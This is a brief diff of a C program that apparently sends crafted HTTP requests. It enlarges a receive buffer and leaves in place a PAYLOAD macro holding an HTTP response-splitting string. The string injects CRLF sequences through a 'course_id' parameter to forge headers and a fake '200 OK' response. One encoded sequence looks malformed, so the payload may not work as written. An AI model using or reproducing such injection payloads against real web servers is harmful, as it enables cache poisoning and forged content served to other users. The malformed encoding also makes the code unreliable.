@@ -177,7 +177,7 @@ void _send(const int32_t client, const void * const data, size_t size) {
 #define PAYLOAD "course_id=67607%0d%0Connection:%20Keep-Alive%0d%0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aLast-Modified:%20Sat%2010%20Jan%202026%2012:00:00%20GMT%0d%0aContent-Length:%20150"
 
 void empty_recv(const int sockfd) {
-    char buf[8];
+    char buf[1024];
     memset(buf, 0, sizeof(buf));
 
     _recv(sockfd, buf, sizeof(buf));
